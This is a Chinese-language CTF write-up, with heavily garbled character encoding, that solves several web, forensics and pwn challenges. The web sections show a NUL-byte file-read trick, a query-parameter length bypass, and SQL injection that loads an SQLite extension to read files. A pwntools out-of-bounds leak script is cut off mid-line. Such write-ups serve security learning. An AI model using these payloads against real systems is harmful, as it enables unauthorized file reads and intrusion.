&#x27;bctf\\&#123;[^&#125;]*\\&#125;&#x27;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125; è®¿é—®è¿™ä¸ª URL æ—¶ï¼Œå‘ç”Ÿçš„æ˜¯è¿™å‡ æ­¥â€”â€” 1. Apache ä½œä¸º CGI å¯åŠ¨ awk è„šæœ¬ ç›¸å½“äºæ‰§è¡Œäº†ï¼ˆç”± Apache å‘èµ·ï¼Œä¸æ˜¯ä½ èƒ½ä¸‹å‘½ä»¤ï¼‰ï¼š 1/bin/awk -f /usr/lib/cgi-bin/awklet.awk å¹¶ç»™å®ƒä¸€å †ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­æœ€å…³é”®çš„æ˜¯ï¼š 1QUERY_STRING=&quot;font=/proc/self/environ%00&amp;name=%20&quot; 2. awk è„šæœ¬è§£æå‚æ•°å¹¶åš NUL æˆªæ–­ è„šæœ¬æŠŠ %00 è¿˜åŸæˆçœŸå®çš„ \\x00ï¼Œäºæ˜¯ï¼š 12font_name = &quot;/proc/self/environ\\0&quot;filename = font_name &quot;.txt&quot; # é€»è¾‘ä¸Šæ˜¯ &quot;/proc/self/environ\\0.txt&quot; åº•å±‚ getline &lt; filename è°ƒç”¨æ–‡ä»¶æ‰“å¼€å‡½æ•°æ—¶ï¼Œ\\0 ä¼šæˆªæ–­åé¢çš„ .txtï¼Œäºæ˜¯å®é™…æ‰“å¼€çš„æ˜¯ï¼š 1/proc/self/environ 3. awk ç”¨ getline è¯»æ–‡ä»¶ï¼Œä¸æ˜¯è·‘å¤–éƒ¨å‘½ä»¤ æ ¸å¿ƒç›¸å½“äºï¼ˆä¼ªä»£ç ï¼‰ï¼š 123while ((getline line &lt; &quot;/proc/self/environ&quot;) &gt; 0) &#123; font[char, row] = line # æ¯ 7 è¡Œç®—ä¸€â€œå—â€&#125; ç„¶åæ ¹æ® name=%20ï¼ˆç©ºæ ¼ï¼ŒASCII 32ï¼Œå¯¹åº”ç¬¬ 1 å—ï¼‰æŠŠå‰ 7 è¡Œæ‰“å°å‡ºæ¥ï¼Œå¹¶å¸¦ä¸Š CGI å¤´ï¼š 12345Status: 200 OKContent-type: text/plainHere&#x27;s your /proc/self/environ ascii art:&lt;â€¦â€¦7 è¡Œå†…å®¹â€¦â€¦&gt; å¦‚æœç”¨â€œç³»ç»Ÿè°ƒç”¨â€è§†è§’æ¥æ¯”å–»ï¼Œå¤§æ¦‚å°±æ˜¯ï¼š 1234execve(&quot;/bin/awk&quot;, [&quot;/bin/awk&quot;,&quot;-f&quot;,&quot;/usr/lib/cgi-bin/awklet.awk&quot;], ENV)open(&quot;/proc/self/environ&quot;, O_RDONLY)read(...)write(1, &quot;Status: 200 OK\\r\\nContent-type: text/plain\\r\\n\\r\\n...&quot;, ...) æ‰€ä»¥ï¼Œè¿™ä¸ª URL çš„æ•ˆæœç­‰ä»·äºè®© CGI è¿›ç¨‹è‡ªå·±æ‰“å¼€å¹¶è¯»å– /proc/self/environï¼Œå¹¶æŠŠå…¶ä¸­å‰ 7 è¡Œé€šè¿‡ HTTP å“åº”å›æ˜¾å‡ºæ¥â€”â€”æ²¡æœ‰é¢å¤–çš„å¤–éƒ¨å‘½ä»¤è¢«æ‰§è¡Œã€‚ BIG CHUNGUS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271import express from &quot;express&quot;;const app = express();app.get(&quot;/&quot;, (req, res) =&gt; &#123; if (!req.query.username) &#123; res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;NO CHUNGUS&lt;/title&gt; &lt;style&gt; body &#123; font-family: Comic Sans MS; background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff); animation: rainbow 2s infinite; text-align: center; padding: 50px; &#125; @keyframes rainbow &#123; 0% &#123; background-position: 0% 50%; &#125; 50% &#123; background-position: 100% 50%; &#125; 100% &#123; background-position: 0% 50%; &#125; &#125; h1 &#123; font-size: 100px; color: white; text-shadow: 5px 5px black; &#125; img &#123; width: 300px; border: 10px solid yellow; animation: spin 1s infinite; &#125; @keyframes spin &#123; from &#123; transform: rotate(0deg); &#125; to &#123; transform: rotate(360deg); &#125; &#125; .marquee &#123; font-size: 50px; color: lime; animation: marquee 3s linear infinite; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;NO CHUNGUS DETECTED&lt;/h1&gt; &lt;div class=&quot;marquee&quot;&gt;âš ï¸ WARNING: NO CHUNGUS FOUND âš ï¸&lt;/div&gt; &lt;img src=&quot;https://i.imgflip.com/aaxz3e.jpg&quot; alt=&quot;NO CHUNGUS&quot; onerror=&quot;this.src=&#x27;data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%3ENO CHUNGUS%3C/text%3E%3C/svg%3E&#x27;&quot;&gt; &lt;p style=&quot;font-size: 30px; color: red;&quot;&gt;ğŸ˜¢ WHERE IS CHUNGUS? ğŸ˜¢&lt;/p&gt; &lt;form method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Enter username...&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt; &lt;button type=&quot;submit&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt;CHECK CHUNGUS&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; `); return; &#125; if (req.query.username.length &gt; 0xB16_C4A6A5) &#123; res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BIG CHUNGUS!!!&lt;/title&gt; &lt;style&gt; body &#123; font-family: Impact, Arial Black; background: repeating-linear-gradient(45deg, #ff0000, #ff0000 10px, #ffff00 10px, #ffff00 20px); text-align: center; padding: 20px; animation: shake 0.5s infinite; &#125; @keyframes shake &#123; 0%, 100% &#123; transform: translate(0, 0); &#125; 25% &#123; transform: translate(-10px, 10px); &#125; 75% &#123; transform: translate(10px, -10px); &#125; &#125; h1 &#123; font-size: 150px; color: #ff00ff; text-shadow: 10px 10px 0px #00ffff, 20px 20px 0px #ffff00; animation: pulse 0.3s infinite; &#125; @keyframes pulse &#123; 0%, 100% &#123; transform: scale(1); &#125; 50% &#123; transform: scale(1.1); &#125; &#125; img &#123; width: 500px; border: 20px dashed lime; animation: zoom 0.5s infinite alternate; &#125; @keyframes zoom &#123; from &#123; transform: scale(1); &#125; to &#123; transform: scale(1.2); &#125; &#125; .username &#123; font-size: 40px; color: white; background: black; padding: 10px; &#125; .blink &#123; animation: blink 0.5s infinite; &#125; @keyframes blink &#123; 0%, 50% &#123; opacity: 1; &#125; 51%, 100% &#123; opacity: 0; &#125; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;BIG CHUNGUS!!!&lt;/h1&gt; &lt;div class=&quot;username blink&quot;&gt;Welcome, $&#123;req.query.username&#125;!&lt;/div&gt; &lt;img src=&quot;https://purepng.com/public/uploads/large/big-chungus-jkg.png&quot; alt=&quot;BIG CHUNGUS&quot; onerror=&quot;this.src=&#x27;data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%3EBIG CHUNGUS%3C/text%3E%3C/svg%3E&#x27;&quot;&gt; &lt;p style=&quot;font-size: 50px; color: white; background: red; padding: 20px;&quot;&gt;ğŸ‰ YOU FOUND THE BIGGEST CHUNGUS! ğŸ‰&lt;/p&gt; &lt;p style=&quot;font-size: 30px; color: lime;&quot;&gt;FLAG: $&#123; process.env.FLAG || &quot;FLAG_NOT_SET&quot; &#125;&lt;/p&gt; &lt;marquee style=&quot;font-size: 60px; color: yellow;&quot;&gt;BIG CHUNGUS IS HERE BIG CHUNGUS IS HERE BIG CHUNGUS IS HERE&lt;/marquee&gt; &lt;form method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Enter username...&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt; &lt;button type=&quot;submit&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt;CHECK CHUNGUS&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; `); return; &#125; res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;little chungus - so very sad&lt;/title&gt; &lt;style&gt; body &#123; font-family: &#x27;Times New Roman&#x27;, serif; background: linear-gradient(to bottom, #1a1a2e, #16213e, #0f3460); text-align: center; padding: 30px; color: #e0e0e0; position: relative; overflow: hidden; min-height: 100vh; &#125; .rain &#123; position: absolute; width: 100%; height: 100%; top: 0; left: 0; pointer-events: none; z-index: 0; &#125; .drop &#123; position: absolute; width: 2px; height: 50px; background: rgba(150, 200, 255, 0.5); animation: fall linear infinite; animation-duration: var(--duration); animation-delay: var(--delay); left: var(--left); top: -50px; &#125; @keyframes fall &#123; to &#123; top: 100vh; opacity: 0; &#125; &#125; .content &#123; position: relative; z-index: 1; &#125; h1 &#123; font-size: 80px; color: #a0a0a0; text-shadow: 3px 3px 10px rgba(0,0,0,0.8); animation: fadeInOut 3s ease-in-out infinite; margin: 20px 0; &#125; @keyframes fadeInOut &#123; 0%, 100% &#123; opacity: 0.5; &#125; 50% &#123; opacity: 1; &#125; &#125; h2 &#123; font-size: 40px; color: #888; margin: 30px 0; font-style: italic; &#125; .username &#123; font-size: 28px; color: #bbb; margin: 30px 0; padding: 15px; background: rgba(0,0,0,0.3); border-left: 5px solid #555; &#125; img &#123; width: 250px; border: 5px solid #555; opacity: 0.7; filter: grayscale(70%); animation: shrink 2s ease-in-out infinite; margin: 20px 0; &#125; @keyframes shrink &#123; 0%, 100% &#123; transform: scale(1); &#125; 50% &#123; transform: scale(0.95); &#125; &#125; .sad-message &#123; font-size: 24px; color: #999; margin: 30px 20px; line-height: 1.8; font-style: italic; &#125; .tears &#123; font-size: 60px; animation: cry 1s ease-in-out infinite; margin: 20px 0; &#125; @keyframes cry &#123; 0%, 100% &#123; transform: translateY(0); &#125; 50% &#123; transform: translateY(10px); &#125; &#125; form &#123; margin-top: 40px; padding: 20px; background: rgba(0,0,0,0.4); border-radius: 10px; display: inline-block; &#125; input, button &#123; font-size: 18px; padding: 10px; background: #2a2a3e; color: #ddd; border: 1px solid #555; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;rain&quot; id=&quot;rain&quot;&gt;&lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;div class=&quot;tears&quot;&gt;ğŸ˜¢ ğŸ’§ ğŸ˜­&lt;/div&gt; &lt;h1&gt;little chungus&lt;/h1&gt; &lt;h2&gt;so very, very little...&lt;/h2&gt; &lt;div class=&quot;username&quot;&gt;Welcome, $&#123;req.query.username&#125;...&lt;/div&gt; &lt;img src=&quot;https://images.steamusercontent.com/ugc/943958709953537755/556C9BC26D0E7261242A75A13AF865DA892DFEBC/?imw=5000&amp;imh=5000&amp;ima=fit&amp;impolicy=Letterbox&amp;imcolor=%23000000&amp;letterbox=false&quot; alt=&quot;little chungus&quot; onerror=&quot;this.src=&#x27;data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%3Elittle chungus%3C/text%3E%3C/svg%3E&#x27;&quot;&gt; &lt;div class=&quot;sad-message&quot;&gt; &lt;p&gt;ğŸ˜¢ It is truly a tragedy... The chungus is so very, very little...&lt;/p&gt; &lt;p&gt;ğŸ’” Why must the chungus suffer so? Why must it be so small?&lt;/p&gt; &lt;p&gt;ğŸŒ§ï¸ The universe weeps for this tiny chungus...&lt;/p&gt; &lt;p&gt;ğŸ˜ One day, perhaps, the chungus will grow... but today is not that day...&lt;/p&gt; &lt;p&gt;ğŸ’§ We can only hope... and dream... of a BIGGER chungus...&lt;/p&gt; &lt;/div&gt; &lt;form method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Try again... maybe...&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Search for Hope&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script&gt; const rain = document.getElementById(&#x27;rain&#x27;); for (let i = 0; i &lt; 50; i++) &#123; const drop = document.createElement(&#x27;div&#x27;); drop.className = &#x27;drop&#x27;; drop.style.setProperty(&#x27;--left&#x27;, Math.random() * 100 + &#x27;%&#x27;); drop.style.setProperty(&#x27;--duration&#x27;, (Math.random() * 2 + 1) + &#x27;s&#x27;); drop.style.setProperty(&#x27;--delay&#x27;, Math.random() * 2 + &#x27;s&#x27;); rain.appendChild(drop); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; `);&#125;);app.listen(3000, () =&gt; &#123; console.log(&quot;Server running on port 3000&quot;);&#125;); æ³¨æ„åˆ°è¿™é‡Œçš„åˆ¤æ–­æ¡ä»¶ï¼š 1if (req.query.username.length &gt; 0xB16_C4A6A5) 0xB16_C4A6A5 å¯¹åº”çš„åè¿›åˆ¶æ•°æ˜¯47626626725ã€‚æˆ‘ä»¬åªéœ€è¦è®©æˆ‘ä»¬è¾“å…¥çš„åå­—çš„é•¿åº¦å¤§äºè¿™ä¸ªæ•°å³å¯ã€‚ä½†ç›´æ¥è¾“å…¥é‚£ä¹ˆé•¿çš„åå­—è‚¯å®šä¸ç°å®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç»™è®¾ç½®ä¸€ä¸ªlengthå±æ€§ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è®¿é—®ï¼š 1https://big-chungus.challs.pwnoh.io/?username[length]=47626626726 å³å¯çœ‹åˆ°flagï¼š 1bctf&#123;b16_chun6u5_w45_n3v3r_7h15_b16&#125; æˆåŠŸåçš„è¿™ä¸ªé¡µé¢å®ƒè¿˜ä¸€ç›´åœ¨æ™ƒï¼Œæˆ‘è¯´å®è¯è¿™çœŸçš„æœ‰ç‚¹ç²¾ç¥æ±¡æŸ“äº†â€¦ Packages 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import sqlite3import jsonfrom flask import Flask, request, render_template_stringapp = Flask(__name__)db = sqlite3.connect(&quot;packages.db&quot;, check_same_thread=False)db.enable_load_extension(True)db.row_factory = sqlite3.RowTEMPLATE = &quot;&quot;&quot;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Package Search&lt;/title&gt; &lt;style&gt; body &#123; font-family: sans-serif; max-width: 800px; margin: 2rem auto; &#125; form &#123; margin-bottom: 1rem; &#125; table &#123; border-collapse: collapse; width: 100%; &#125; th, td &#123; border: 1px solid #ccc; padding: 0.5rem; text-align: left; &#125; th &#123; background: #f4f4f4; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Package Search&lt;/h1&gt; &lt;form method=&quot;get&quot;&gt; &lt;label&gt;Distro: &lt;input name=&quot;distro&quot; value=&quot;&#123;&#123; request.args.get(&#x27;distro&#x27;, &#x27;&#x27;) &#125;&#125;&quot;&gt; &lt;/label&gt; &lt;label&gt;Package: &lt;input name=&quot;package&quot; value=&quot;&#123;&#123; request.args.get(&#x27;package&#x27;, &#x27;&#x27;) &#125;&#125;&quot;&gt; &lt;/label&gt; &lt;button type=&quot;submit&quot;&gt;Search&lt;/button&gt; &lt;/form&gt; &#123;% if results %&#125; &lt;h2&gt;Showing &#123;&#123; results|length &#125;&#125; result&#123;&#123; &#x27;s&#x27; if results|length != 1 else &#x27;&#x27; &#125;&#125;&lt;/h2&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;Distro&lt;/th&gt; &lt;th&gt;Distro Version&lt;/th&gt; &lt;th&gt;Package&lt;/th&gt; &lt;th&gt;Package Version&lt;/th&gt; &lt;/tr&gt; &#123;% for row in results %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; row[&#x27;distro&#x27;] &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; row[&#x27;distro_version&#x27;] &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; row[&#x27;package&#x27;] &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; row[&#x27;package_version&#x27;] &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/table&gt; &#123;% else %&#125; &lt;p&gt;No results found.&lt;/p&gt; &#123;% endif %&#125;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): distro = request.args.get(&quot;distro&quot;, &quot;&quot;).strip().lower() package = request.args.get(&quot;package&quot;, &quot;&quot;).strip().lower() sql = &quot;SELECT distro, distro_version, package, package_version FROM packages&quot; if distro or package: sql += &quot; WHERE &quot; if distro: sql += f&quot;LOWER(distro) = &#123;json.dumps(distro)&#125;&quot; if distro and package: sql += &quot; AND &quot; if package: sql += f&quot;LOWER(package) = &#123;json.dumps(package)&#125;&quot; sql += &quot; ORDER BY distro, distro_version, package&quot; print(sql) results = db.execute(sql).fetchall() return render_template_string(TEMPLATE, request=request, results=results)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=8000) ä¸éš¾å‘ç°è¿™é“é¢˜æ˜¯éœ€è¦SQL injectionã€‚ä½†æ˜¯ç”±äºSQLæœ¬èº«çš„åŠŸèƒ½æ˜¯ä¸æ”¯æŒè¯»å–flag.txtæ–‡ä»¶çš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆåŠ è½½é¢å¤–çš„extensionï¼Œæ‰èƒ½è¿›è¡Œè¯»å–æ“ä½œã€‚ ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼š 1a&quot; UNION SELECT &#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27; -- æŒ‰é¡ºåºä¾æ¬¡å°è¯•ï¼ˆåœ¨Distroæ è¾“å…¥ä»¥ä¸‹ï¼‰ä»¥ä¸‹å‘½ä»¤ä¾¿å¯ä»¥æ‹¿åˆ°flagï¼š 1. åˆ©ç”¨load_extensionæ¥åŠ è½½æ‰©å±•ï¼š 1a&quot; UNION SELECT &#x27;a&#x27;,&#x27;a&#x27;,CAST(load_extension(&#x27;/sqlite/ext/misc/fileio.so&#x27;) AS TEXT),&#x27;a&#x27; -- 2. åˆ©ç”¨æ‰©å±•å‡½æ•°è¯» flagï¼š 1a&quot; UNION SELECT &#x27;a&#x27;,&#x27;a&#x27;,readfile(&#x27;/app/flag.txt&#x27;),&#x27;a&#x27; -- 1bctf&#123;y0uv3_g0t_4n_apt17ud3_f0r_7h15&#125; ForensicsBugle è¿™é“é¢˜æˆ‘ä»¬ä¼šæ‹¿åˆ°ä¸€ä¸ªmp3éŸ³é¢‘ã€‚ä»”ç»†å¬ï¼ˆè¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œå› ä¸ºå®ƒå¹çš„é•¿çŸ­éŸ³ä¸æ˜¯å¾ˆæ˜æ˜¾ï¼Œæ‰€ä»¥ä¸»è¦é è€³æœµå¬ï¼‰ï¼Œå¹¶ä¸”ç”¨éŸ³é¢‘è§£æè½¯ä»¶æ‰“å¼€å®ƒæ¥åšæ›´è¿›ä¸€æ­¥çš„åˆ¤æ–­ï¼ˆä¸»è¦æ˜¯åˆ¤æ–­æ–­ç‚¹ï¼‰ï¼Œå°±ä¼šå¾—åˆ°æ‘©æ–¯å¯†ç ï¼š 12_ _ | _ _ _ | ._. | ... | . | ._ | ._.. | ._.. | ._ | ._.. | _ _ _ | _. | _ _ . m o r s e a l l a l o n g æ‰€ä»¥flagå°±æ˜¯ï¼š 1bctf&#123;morseallalong&#125; Big Data Analysis è¿™é“é¢˜å¯ä»¥ç›´æ¥ç”¨ GitHub Archive çš„ BigQuery å…¬å…±æ•°æ®é›† æ¥æŸ¥ã€‚è¿™æ˜¯ä¸“é—¨å­˜ GitHub äº‹ä»¶æµï¼ˆåŒ…æ‹¬ CreateEventï¼‰çš„æ•°æ®åº“ã€‚ æ ¹æ®GitHub Archiveå®˜æ–¹é¡µå­¦ä¹ æ€ä¹ˆåœ¨ BigQuery é‡Œæ‰“å¼€æ•°æ®é›†ã€‚ï¼šhttps://www.gharchive.org/ ç„¶åä½¿ç”¨è¿™ä¸ªSQLè¯­å¥æŸ¥è¯¢ï¼š 123SELECT COUNT(DISTINCT repo.name) AS uniq_reposFROM `githubarchive.year.2023`WHERE type = &#x27;CreateEvent&#x27;; 1bctf&#123;63421480&#125; PwnCharacter assassination 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;char flag[64] = &quot;bctf&#123;fake_flag&#125;&quot;;char upper[] = &#123; &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;\\t&#x27;, &#x27;\\n&#x27;, &#x27;\\x0b&#x27;, &#x27;\\x0c&#x27;, &#x27;\\r&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;\\&#x27;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;,&#125;;char lower[] = &#123; &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;\\t&#x27;, &#x27;\\n&#x27;, &#x27;\\x0b&#x27;, &#x27;\\x0c&#x27;, &#x27;\\r&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;\\&#x27;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;[&#x27;, &#x27;\\\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;,&#125;;int main() &#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (f) &#123; fgets(flag, sizeof(flag), f); fclose(f); &#125; char input[256]; while (1) &#123; printf(&quot;&gt; &quot;); if (!fgets(input, sizeof(input), stdin)) &#123; break; &#125; for (int i = 0; i &lt; sizeof(input) &amp;&amp; input[i]; i++) &#123; char c = input[i]; if (i % 2) &#123; printf(&quot;%c&quot;, upper[c]); &#125; else &#123; printf(&quot;%c&quot;, lower[c]); &#125; &#125; printf(&quot;\\n&quot;); &#125;&#125; ä¸éš¾å‘ç°è¿™é‡Œæ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„æ•°å­—è¿›è¡Œç®¡æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¶Šç•Œä¸€ç‚¹ä¸€ç‚¹è¯»å–flagçš„å†…å®¹ã€‚åœ¨IDAé‡Œå¯ä»¥å‘ç°flagå’Œupperåœ¨dataé‡Œçš„ä½ç½®éå¸¸é è¿‘ï¼š æ‰€ä»¥è¾“å…¥è®¡ç®—å¥½çš„åç§»æ•°å³å¯ï¼š 1234567891011121314151617181920212223from pwn import *context.log_level = &#x27;debug&#x27;p = remote(&quot;character-assassination.challs.pwnoh.io&quot;, 1337, ssl=True)def leak(n): &quot;&quot;&quot;æ³„éœ² flag[n]ï¼Œn ä» 0 å¼€å§‹&quot;&quot;&quot; idx = (0xC0 + n) &amp; 0xff # -0x40 + n payload = b&quot;A&quot; + bytes([idx]) + b&quot;\\n&quot; p.recvuntil(b&quot;&gt; &quot;) p.send(payload) line = 